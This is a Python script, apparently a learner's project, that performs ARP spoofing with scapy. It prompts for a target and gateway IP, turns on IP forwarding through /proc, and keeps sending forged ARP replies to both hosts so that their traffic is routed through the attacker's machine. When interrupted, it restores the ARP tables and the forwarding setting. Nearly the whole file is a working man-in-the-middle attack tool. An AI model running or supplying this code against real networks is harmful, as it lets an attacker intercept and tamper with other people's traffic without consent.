from colorama import Fore
from colorama import Style
import scapy.all
import time

default_ip_forward_value = 0

def arp_spoofing_main():
    print(f"{Fore.BLACK}Welcome to Arp Spoofer\n{Style.RESET_ALL}")
    try:
        arp_spoof()
    except KeyboardInterrupt:
        print(f"{Fore.RED}\n[!] Exiting {Style.RESET_ALL}")
        time.sleep(3)
        
def host_up(ipaddress):
    #To check that he ip address is up or reachable
    arp_request = scapy.all.ARP(pdst=ipaddress)
    broadcast = scapy.all.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_boroadcast =  broadcast/arp_request
    answered = scapy.all.srp(arp_request_boroadcast, timeout=.5, verbose=0)
    return answered[0]

def arp_spoof():
    target_ip = input("[+] Please Entern the ip address : ")
    result = host_up(target_ip)
    if not result:
        print(f"{Fore.YELLOW}[!] Target Is not Up!{Style.RESET_ALL}")
        return
    router_ip = input("[+] Enter router ip address : ")
    result = host_up(router_ip)
    if not result:
        print(f"{Fore.YELLOW}[!] Router / Gateway is Down  []  Please check gateway ip address{Style.RESET_ALL}")
        return
    ipv4_forwarding()
    counter = 0
    try:
        while True:
            spoof(target_ip,router_ip) 
            spoof(router_ip,target_ip)
            counter = counter + 2 
            print(f"\r[*] Packet Sent : {Fore.MAGENTA}" + str(counter), end=f"{Style.RESET_ALL}")
            time.sleep(2)
    except KeyboardInterrupt:
        print(f"{Fore.YELLOW}\n[*] Restoring Targer ARP Table{Style.RESET_ALL}")
        restore(target_ip,router_ip)
        print(f"{Fore.YELLOW}\n[*] Restoring Router ARP Table{Style.RESET_ALL}")
        restore(router_ip,target_ip)
        ipv4_forwarding_restore()
        
def spoof(target_ip,spoofIpAddress):
    print("iam in spoof")
    #create a arp packet arp response (scapy.all.ls(scapy.ARP))
    #change the paramenter of arp op as by default it is 1 i.e. arp request but we need a forge a response
    #telling the target that we are router
    #target is the host that we are tell
    #spoof is the we are telling the target that whant are we 
    Target_mac= get_mac(target_ip)
    #in the we dont specify psrc and hwsrc as it automaitcaly get our 
    #pdst = > target ip
    #hwdst => target mac
    #psrc => pretend to be Coming from
    #in this request hwsrc is the mac address of our machine
    packet = scapy.all.ARP(op=2, pdst=target_ip,hwdst=Target_mac,psrc=spoofIpAddress)
    print("----------------------Packet sppofed---------------------")
    print(packet.show())
    print(packet.summary())
    print("---------------------------------------------------------")
    #send the packet
    scapy.all.send(packet,verbose=True)
    
def ipv4_forwarding():
    # funtion to enable ip forwarding
    file_name="/proc/sys/net/ipv4/ip_forward"
    print("iam in ipv4_forwarding")
    with open(file_name,'r') as f:
        value = f.read()
        print("value=", value)
        if (int(value)==1):
            print(f"{Fore.GREEN}[*] Ip Forwarding already Enabled !{Style.RESET_ALL}")
            global default_ip_forward_value
            default_ip_forward_value = 1
        else :
            with open(file_name,"w") as f:
                print(f"{Fore.GREEN}[*] Enabling Ip forwarding ! {Style.RESET_ALL}")
                f.write("1")
                
                
def get_mac(ip):
    try:
        #get mac address for the ip address we spoof
        arp_request = scapy.all.ARP(pdst=ip)
        broadcast = scapy.all.Ether(dst="ff:ff:ff:ff:ff:ff")               
        arp_request_boroadcast =  broadcast/arp_request
        # in the following request we will ony get one result as we only provided one ip address to map to its mac address
        answered = scapy.all.srp(arp_request_boroadcast, timeout=.5, verbose=0)[0]
        # returnt the first element of the list
        return answered[0][1].hwsrc
    except Exception:
        pass

def ipv4_forwarding_restore():
    #funtion to restore the default value of the file
    print(f"{Fore.YELLOW}\n[*] Restoring Ip forwarding value !{Style.RESET_ALL}")
    file_name="/proc/sys/net/ipv4/ip_forward"
    with open(file_name) as f:
        value=f.read()
        print("value=", value, "   default_ip_forward_value", default_ip_forward_value)
        if (int(value)!=default_ip_forward_value):
            with open(file_name,"w") as f:
                f.write("0")

def restore(destination_ip,source_ip):
    #restoring the arp table on the trage and router side
    destination_mac=get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    #pdst = > target ip
    #hwdst => target mac
    #psrc => pretend to be comming from
    #in the the hwsrc is the actual mac address of the the router
    packet= scapy.all.ARP(op=2, pdst=destination_ip,hwdst=destination_mac,psrc=source_ip,hwsrc=source_mac)
    print("-----------------------packet-----------------------------")
    print(packet)
    print("----------------------------------------------------------")
    # Send crafted Packet
    scapy.all.send(packet,verbose=True)
    
arp_spoofing_main()
